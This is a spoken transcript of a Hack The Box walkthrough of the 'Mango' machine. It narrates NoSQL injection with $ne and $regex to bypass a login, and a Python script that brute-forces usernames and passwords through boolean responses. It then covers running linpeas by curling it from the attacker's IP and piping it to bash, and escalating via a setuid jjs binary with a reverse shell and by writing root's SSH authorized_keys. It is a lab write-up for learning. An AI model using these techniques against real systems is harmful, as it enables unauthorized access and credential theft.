 what's going on youtube this is ipsec me doing mango from hack the box which starts off you trying to find a database if you can't tell based upon the name and the leafs and all the pictures this box runs which is a nosql database a lot of people used to think nosql wasn't injectable because it doesn't feature a lot of the traditional sql syntax however through type confusion you can make it do interesting things and normally get some type of boolean injection as we'll show in this video by writing a python script to extract usernames and passwords out of the database and then use them to ssh into the box and once you get access to the box privasc is as simple as running like a linux enumeration script to see a set uid binary and then taking that binary and checking gtfo bins and just doing what gtfo bin says so with all that being said let's just jump in as always begin with nmap so dash sc for default scripts sv enumerate versions o a output off formats put in the nmap directory and call it mango and then the ip address which is 10 10 10 162. can take some time to run so i've already ran it looking at the results we have just three ports open the first one being ssh on port 22 and its banner tells us it's a ubuntu box then we have http on port 80. its banner tells us it's running apache httpd and that it's also an ubuntu box and we also have this script http title running telling us whenever it tries to get uh index it the server responds with a 403 forbidden message we have https running on 443 the same exact banner as before but this time that http title script returns an actual webpage and we see it is the mango search base we also have a script ssl-cert leaking the hostname of the server which is staging-order.mango.hdb so i'm going to copy this cert and add it into my host file so etsy hosts and 10 10 10 162 paste that domain and i'm also going to do mango.htb which is the top level domain so exit that and i guess we can move on the key thing to take away is the configuration for port 80 and 443 is different we don't know exactly what is different about it 80 could either just be under a different document root which is the root of the web server and that may not have like an index file and directory listings may be disabled additionally it could have a virtual host configuration on port 80 which brings us to a completely different document route when we give it a host name so i'm just going to go in cherry tree and type that out this box is mango interesting um http and https configs differ first name is leaked and ssl cert so let's go take a look at that uh ssl certificate and see if there's anything interesting so i'm going to https colon slash 101010162 click advanced on this and then click view certificate go to details and we'll just go down this list sometimes you'll find contact information which leaks yes an email address so we have that and let's see what else do we have the cn that we had before not after same exact things i'm checking if maybe there's an alternate name sometimes certificates are good for multiple hosts but in this case i didn't see any of that so let's just go take a look at server and then we can go to 10 10 10 162 and specify http to verify yes that is a forbidden page we could take a look at like robots.txt and see if that's there but we don't get anything could run go buster on this to try to find hosts but spoiler if we go to the actual domain which is the staging order.mango.ht we see it brings us to a page with a login prompt so let's go take a look at https first so if we search things it doesn't look like we're finding anything we can do or one equals one and send this over to burp let's see exactly how this does a search turn this on click it uh that's not it oh weird i don't have my best ssl cert in this let's just accept this request so we can see this responding and uh we get stuff so what i'm gonna do is just put search equals please subscribe and we can right click this uh save item boxes mango and search dot request save it and we can run sql map dasher actually let's look at search.request that is not what i wanted maybe there's copied a file i always get these mixed up there we go copy the file is what i want search.request yes so now when i last this i see the actual what's in the repeater window so i can do sql map dasher search dot request dash dash batch so it automatically moves forward whenever it has a question and what oh oh crap dash dash ssl there's a option in burp to force ssl um or not sql map dash dash force ssl force ssl there we go before it was just going to http and then airing out because there's no uh file there that it's looking for but saying for ssl tells sql map to go to the https version of the site so now that we have that enumerating we can go back to brook turn intercept off continue poking at it look at this mail goes nowhere we get this analytics page which is analytics.php and it looks like a spreadsheet clicking around it is i don't know tough to use so i looked for ways to interact with the server and we got this connect remote so what i tried to do is try to do like server side request forgery by doing http colon slash localhost port 22 and seeing what the error message says unable to open file so i do connect same thing and we'll do https localhost on a port that's not listening so like 9001 and we get the same message so i was just seeing if there was a way to enumerate what ports were open on the server and maybe do some type of protocol smuggling but that's not working so we can probably move on from this so looking at this we have to specify an index trying other things but no way to enumerate ports it looks like from quick glance so i'm going to move on to the next thing and we get this login prompt i'm going to go back look at sql map doesn't look like it's found anything so nothing there so we get this login prompt i'm going to try logging in with admin admin and we just get a weird interaction let's send this to burp so we can take a closer look send in go to repeater this and we just get a 200 okay and it's four three two four bytes so just remember those numbers so we can try basic sql injection to see if we ever get an error we still get four three two four bytes with the single quote try it here on the password and i'm just trying to force some type of error message so instead of trying all a bunch of things whoops did not mean to click that i'm just going to copy this to a file and we're going to say this is login.request and go back here to sql map and say log and doubt request and this is not for ssl because this is the http page so make sure this starts kicking off and then we can take a look at this and this looks a lot like um it reminds me of  just seeing a bunch of mangoes which is a no sql database and no sql is injectable so if we turn firefox off so i can just google something uh no sql injection rug x and e ge this will probably bring us to a good blog post that kind of explains a bunch of things and essentially no sql injection in um i guess web applications is a type confusion type vulnerability so we can see when we're requesting the username not equals to something it does a weird thing so you can read those two articles and maybe what i'm about to say will make sense but i'll attempt to explain it very quickly we have sql map not telling us anything so let's just go back here and i'm going to do no sql primer so essentially with normal sql injection you have select star from username where username is equal to a variable and if you inject into here you turn this into like where username is equal to um i guess we do that our username is equal to ipsec or username is not equal to ipsec so now this will always evaluate to true we injected this entire thing and then we generally put like a quote uh a comment at the end so anything the application puts is ignored but this is essentially what we do in normal sql injection we just append a string and no sql the query is a bit weird it is like um user find one array and then username is equal to user so this is kind of like a nosql query and we it doesn't really support like or username not equal to user it doesn't support doing syntax exactly like this in order to do thing queries like this you give it a array or object oh computer did not like that keystroke so what we give it is an object and get it to say like not equal to something and this makes nosql translate it so how do we send an object in web well for php applications we can put it here before this equals so if we say username is not equal to please subscribe to and password is not equal to whoops password not equal to tip sec we have to put not equal here and click send we now get a 302 found instead of the 200 because we turned the query into the not equals so we essentially turned this or had a query like this and made it this and no sql syntax not the best with nosql but hopefully that makes sense um there are other things you can do with this i think i closed the tab uh undo close tab can we do it up here like regex and regex is a cool one because we can do regular expressions so we can turn this if we want to know like how many characters a username can be we can say rugex and then it would be begins with so the character so this is new line and then we do a period which is um any character but like a line break and then one so this is repeated one so do we have a one character user three or two found i guess we have to put maybe the dollar sign to terminate it so we get 200 okay because there's no one character passwords again this means start of line and this means end of line so i'm going to try 2 we get 200 okay 3 4 5 and we get a 302 found so we know there's a 5 character username somewhere and the same exact thing works for the password as well so we'll go into more of that once we start coding this out but there's one thing i want to mention and when you do know sql injection it works this way in php normally but if you go to a language like node.js it's not going to like accept variables like this so in order to do it in nodejs what we would do is instead of telling the application this is a www form url encoded we change this to application json i believe and then this payload we just convert uh convert into json so it would be user name and then um not equal do please subscribe to and then a comma password and then we give it the same thing so not equal to ipsec whoops i need to close this out and then finally log in is equal to log n so always try something like this because this will work on like express js and things if it's vulnerable but we get a 200 okay even though this is valid so the php applications not accepting application slash json so i'm going to hit control v a bunch to get this back to where we started and now let's just send this data to the web server and see what happens upon a valid login so let's go back to uh stagingmongo.htb turn intercept on so go to proxy intercept is on try logging in with ipsec ipsec click login and we'll change this to be not equal to ipsec and password is not equal to ipsec for this request along we get the redirect and we just get a page that says under plantation so i'm going to try to curl just this page and we still get a 3002 and the location points us back to index.php if we give it a cookie well we don't go back to index.php obviously so let's run this through go buster but give it a cookie to see if we can find other php scripts because maybe there's something like admin.php that you can only access when uh you've already logged in so let's go back to proxy intercept on refresh this page copy this php session and we will do go buster dir h and we can do dash u for url http actually nope php slash id is my uh clipboard so http staging dash order.mongo.htb mango.htb right yeah staging order.mango.htb and we'll do w for wordlist user share wordlist uh user share robust oh i spelled out user user share word list doorbuster directory list23 medium dot text dash x for extension because we want to look for php files and then the cookies is dash c so we'll do dash c and crap i just copied that uh copy paste go back copy that paste and then we'll do dash o for output file go buster staging logged in dot out so now that we are looking for valid files we could also try changing this to index.php but it looks like it will probably just direct us to home.php now we still get the login but we can access irm.php just fine so what we have to do now is probably create a script to enumerate the information inside of because if we look at a repeater we made a valid login but through boolean injection and using the regex parameter we can actually pull out data and to do that easily i'm going to use a script if you don't want to use a script you can probably use the paid feature in burp intruder we can probably send do this real quick positions so this will be regex and we'll do starts with data and ends with star maybe no yeah we'll do star or dotstra get rid of these so in intruder anything in this little whatever symbol this is will be sent and i think snipe would be the correct thing the payloads add from list a to z there we go and i think that's right so what this is going to do is take that list a to z and insert it in between this parameter if i did this correctly and then we can sort by status and we can see upon the data being a or the data being m we get a 302 because the reg x4 begins with a contains any character and then unlimited number of characters matched so we got two valid users and we just keep going down this list so i do a if i want to look at this start attack and then sort by status cd so that's how i'd go through this in using burp suite if i don't want to do any programming so adm we can guess this is probably admin or administrator and based upon the previous thing of showing us its five characters it's probably gonna be admin so this is just a stupid way to brute force it but we don't like stupid ways to brute force here we wanna actually do the privesque and we can see once i did admin it's no longer giving us 302s because it's trying to match a character after admin and it fails to so we now know the username is admin so let's code a script in case we didn't have that paid feature or want to do it in a more automated feature so i'm going to do vi attack.php and the first module we of course want is um request so let's say attack.php attack.pi and import request now what we want to do is just create a function that will return true if our attack was successful i'm going to do def inject data and we can do r is equal to request dot post http staging dash order dot mango.htb and i think it's just on slash it is and the next thing we need to do is data is equal to data and that should be good if our dot status code that is this response is not equal to 200 return true so now we can do data is equal to username not equal to please subscribe to and password is not equal to ipsec and login is equal to login i think that is correct we can say if inject.data print success else print failure so all i'm trying to do is get the skeleton working so let's do python3 attack dot pi and we get failure so something bad happened let's go back and do a proxy so proxies is equal to http and we need to make this addict localhost 8080 so now we're sending a request to burp suite so let's go back to burp intercept off turn intercept on send this and the first thing we see is request is doing a bunch of url formatting and let's see is there a do intercept response to this request so i'm going to send this and intercept the response was that a check mark okay let's do forward we get a 302 but a script told us we got a 200. so let's for this and then we see slash home.php if we intercept the response to this request i think there's a hotkey to do that we get a 200 and then that's it so a request module is actually following redirects so if we go back to firefox we can google like python request do not follow redirect and if we clicked around here we'd see there's an allow redirects option right here so allow redirects equals false so let's try adding that instead of our proxy allow redirects is equal to false run this and now we get success so we have the skeleton script what we have to do now is essentially what i showed in bourbon shooter and that is to repeat a bunch of things so right now let's just do it in the username and what i'm going to do is create a value called secret and that's going to be what we're brute forcing and upon a success i'm gonna append a string to secret and we'll build out what the password is the next thing we have to do is probably an infinite loop which is ugly but this is the easiest way to do this and then indent all this stuff so we can start with four i and range uh man ascii i want to do all characters let's just do lowercase if i wanted to really brute force this i do like all characters so i begin with 41 or 40 if i'm daring to include space and go all the way to 176. so that would cover like all the ascii and there's also python modules and stuff that you can use to build character maps so this is just the way i'm going to do it because it's fast 141 and 176. so range is going to be wait what were those numbers those are oct numbers i'm going to work with decimal let's say that is not what i was thinking a was 97 and 126. so i do python 3 print character of 97 we get a so 97 122 so that's going to loop through all lower case characters and what i'm going to do here is a little bit of a trick with flushing the output to create a cool little like effect of a spinning character so i'm do print backslash r so return character plus secret plus care of i so this is going to be what we're attempting to print i guess i guess i could do um payload actually payload is equal to secret plus care hi and we can do plus payload i should call that password or something naming variables is hard naming anything is tough so do that and then we say flush is equal to false and end is equal to nothing so i don't want a trailing new line because when i put a trailing new line then it flushes my output and flush means just like clear the screen so doing this we'll just keep erasing the line because of the slash r and then printing what we're trying so it's a pretty cool effect um yeah i was going to just run it but i'd have to import time into a sleep because it would just go too quick so don't want to do that so let's take the data away from there put it here and data is equal to begins with plus the payload plus star actually we don't need star because i think by default would do contains so we'll do that and then we can say if inject data then print backslash r plus secret plus payload flush equals true and equals this and then secret is equal to secret plus care i and exit this loop so hopefully this works so we do python3 attack dot pi it doesn't appear to be working so let's see where did i screw up let's see while these are cool effects it makes debugging a pain in the butt so print payload hey okay let's see use oh what i forgot to do is change this to be regex so we can see now it trying everything but we're flushing the input every single time if we don't flush i mean we're flushing stand it out every time if we don't flush it you'll see what that looks like so now we have it doing something cool like this which is pretty cool the downside is right now we have that infinite loop so once it gets to z it's going to repeat so what we have to do is add something to break this infinite loop so we can do this up here and we can say if inject let's see let's copy this data and we can say data is equal to plus end of line and we can do if inject data break so now and we run this again uh secret is that uh payload is equal to nothing a d m so i'm just gonna speed up the video and we'll see if this actually breaks so it correctly broke and our infant loop is no longer infinite as long as that one event happens so if you remember back from when we did this in burp we had a username that began with m as well so in order to quickly easily do that i'm just going to say secret starts with m so this is going to make our script start out at m as the first character and if i run this actually there's one thing i want to do um let's see at the very end of the script after the loop i want to print a blank a blank line so our terminal goes on a new line let's run this and see what that second user is we have m a n g and i'm guessing the final one is o and that's it so i can rename this from attack into user.pi or we'll do enum-user.pi and now we have to do something with the password so let's just say the username is going to be admin and the password is going to be that regex thing so regex oh we have admin plus payload admin regex is begins with and has payload so passwords generally contain uppercase and all those characters so let's go back to man ascii and we're going to start at probably space which is 32 second one is decimal right yep and we're going to go all the way to 126. so 32 126. it's gonna take a lot longer to do and if we're lucky it'll work oh we have to get rid of this begins with m so let this run i'm going to speed up the video and see if it works oh that's funny um so uh and match these dot which is anything and stir so we're gonna have a little bit of an issue when it comes to special characters i don't really consider that with this um well i'm trying to think of a good way to solve this problem other than just not doing those characters which sucks so what if we escape it i guess we can try escaping let's see v attack.pi oh i already have a session let's see while true for range if character of i is in uh this array so we don't want period question mark or star then we will do this payload and escape the special character so question mark backspace plus and based upon syntax highlighting it wants me to escape the escape else payload like that so that should work so if we run this let's see if we get anything so it made it through the set of special characters which is good however it hasn't given us the first character which is bad yet so let's see we got another bad character it begins with so we can end the escape that as well run this again and let's see what it is so this is a bit of trial and error finding all the special characters for regular expression we have to escape so i'm going to fast forward up the video to see what the next thing it is so it looks like we have another bad character plus because it keeps going and saying the password is t plus plus plus not i don't know what's going on there but let's just escape that and i guess one of the key things to mention right now is i don't know if this escaping it is working in the sense that we escape the special character's function or that we just change the payload into be something that will never work so if the password contains one of those special characters who knows what's going to happen we may just think we're done so we'll cross that bridge if we get there i'm gonna speed up the video till we get to the next bad character and it looks like we have another bad character that we didn't think of and that is end of line which probably means the password is this so we can copy this and go back here and say interesting and we can say admin and that is the password we could test this out by just trying to log in so let's clear our cookies so just clearing everything grab data as well come on clear go back to beginning and we can try logging in with admin and what is on the clipboard which is that we get back to home which we did we have a valid password so the next thing to do is let's get the actual username or the other user which is so username or mango i think it's been a while since we did i'm pretty sure it was mango so let that go and then we can also try ssh admin at 10 10 10 1 62 is that right looks right paste to see if we can log in with this user make sure my clipboard was correct it was and we can't log in so let's run through this second user's password to see if this user gets us anything i'm just going to fast forward the video now and we'll come back whenever there's a bunch of dollar signs on the terminal input or a weird character that we didn't expect so and it looks like maybe we got it or we got a bad character i'm not sure why my script just exited i think this pipe could be a bad character so let's just try logging in with it and seeing what happens uh we gotta clear everything again i guess i could open up dev tool and just clear that one cookie but yeah this is probably just as easy so let's try mango and paste this in we get back to that and i'm going to try mango and paste it without that carrot and we still get an error message so let's go back into attack and make sure we're escaping that pipe not sure why that just came up now and didn't before but who knows so escape all those maybe the password has like a plus in it and that's what's screwing us up but let's run this and i'll fast forward the video again because this is a long wait so we'll see what happens and this is now looped a few times and it's not getting the character after this u so i'm guessing that's going to be something that we tried to escape and did not work um what we could do is we can go um paste this in to see exactly how many characters this is wc-c it is nine characters we can go back to burp go to repeater and the username is equal to or mango and the password is going to be regular expression begins with and we'll do 9 dollar sign to see if the password is 9 characters doesn't look like it is 10 11 12 13 14 50 something's wrong let's do six three or two so we'll go when this finishes because it didn't seem to like that dollar sign so 9 10 11 12 13 14 20. okay it's not 20 characters so this is just a long password 16 17 so probably either 16 characters or 17 characters long i'm guessing 16 and we got nine of them so we have to keep going and figure out exactly where we aired out so let's copy this go back into burp and say the password is equal to this if we click send we get a three or two so we try like backsplash plus you're 200 okay if we just try a plus chances are it doesn't work um other special characters if we try uh star we get that but if we do backticks our backslash star we get a 200 okay let's see what are other characters we escaped so we did period question mark stir so let's try period 200 question mark 200 stir 200 that 200 and i wonder if the password could actually have the pipe and that was valid let's see what other characters are we missing let's go back to code and let's see we have 4i in range 32 126. man ascii 32 is space and 126 is the squiggly uh let's see did i do my loop wrong four i and range 32 126 print i and i did so it's not doing that very last item so this probably should be 127 and if we go back here and put that little squiggly that is three or two so i think that was the issue so now we have to let the script run again which is a bit of a pain but fast forward the video so you don't have to sit through it so now we keep getting this um dollar sign so i think we have the password let's test it out if we just try logging in with this password and it works then we know we got it correctly so logged in and we can try the other place to log in which was ssh so go down here do ssh and we can try mango at that paste the password in and we get a shell in the box so finally after a long brute force we have a shell so the first thing i always do is run the groups command to see what groups we are look at the home directory see if there's anything here we can do find dot it doesn't really look like it so let's run the um linux enumeration script from uh previous escalation awesome script suite lin ps and we will just python m simple http server actually let's do python 3 because python 2 is deprecated don't want to share that anymore run that if config tun 0 to see what our ip address is 10 10 14 2. so do we have curl on this box we do curl 10 10 14 2 lan ps.sh and pipe that output over to bash so we'll let this script run and when it does we'll go over all the results and i don't even have to let the script finish right off the bat we see it highlighting something in yellow and red which means it's almost always going to be a prives path and we see user lib jvm java and then jjs so i'm going to take jjs and we're going to go to gtfo bins and see exactly how to use this program so just paste this in and we have a lot so we have shell reverse shell download right what does reverse shell do uh wow it's got quite a bit so let's see we can copy that run nc lnp on attackish thing so i can control c out of this and then v exploit dot sh paste all this in and let's see so our host is going to be 10 10 14 2 our port 9001 and this looks like it's just doing a java reverse shell so we can export did i do 9001 i did bash exploit.sh we can do nc lvnp 9001 run it and we get permission denied lsla user bin jjs let's see lsla etsy alternatives jjs and that's going to this guy which is only executable by users of the admin group so we can do cat etsy groups or etsy group look at admin and that's 1001 for uid got etsy passwd and 1001 is only the admin user so we have to find a way to get over to admin um we have admin's password so let's just try whoops come on uh s-u-admin and then do we still have it we do we can just copy the password and then paste it in and it looks like we can get in so maybe that admin user just can't ssh so we can go to the mango home directory and then execute exploit.s8 which we're trying to do before and let's see doesn't look like it worked not sure what happened and i lost my shell ls it didn't say connected so something bizarre happened and i lost everything so to get back in and i have lost mango's password and i did not log it so that sucks what we can do is copy this so it starts off where we left off and we have to rerun our attack.python script but thankfully we can just put the secret of our password here so now our scripts going to start all the way there so we only have a few characters to brute force and while that goes let's look up gtfo bins and we're going to try something else let's see that did not work i don't know why that didn't but we can try a file right and just try writing data this should be much safer to do let's see new file and data so let us just go into hdb boxes mango sh-key and we're going to call this file i guess mango and ls we got mango.pub we can copy this and v prove ask.sh paste that in go here copy this paste and perfs.sh i always hate copying things and vi i don't know why you think i would have learned it by now but i always just do it that way paste okay so we got mango's password it is this so let's copy this and we'll put it in cherry tree so if we need it again now we have it so we can ssh login seo to admin paste this and then cat privesque we will have to add it file to right so privas dot sh this will be slash root slash dot ssh authorized keys if this doesn't work we can try writing like a cron job or something so cat private.sh copy paste and got a bunch of error messages chmod 600 mango sh-i mango root at 10 10 10 162 and it's asking us for a password so that did not work ls but we didn't lose a shell so the next thing i'm going to do is go into this i'm going to try writing oh root slash dot ssh we can try that the next thing we'll do is try writing into temp and then we can see if the file was created so paste we didn't get as many error messages and there we go so we are root so we can do wc-c root.txt 33 which is 32 characters in a line break and that will be the box hope you guys enjoyed it take care and i'll see you all next week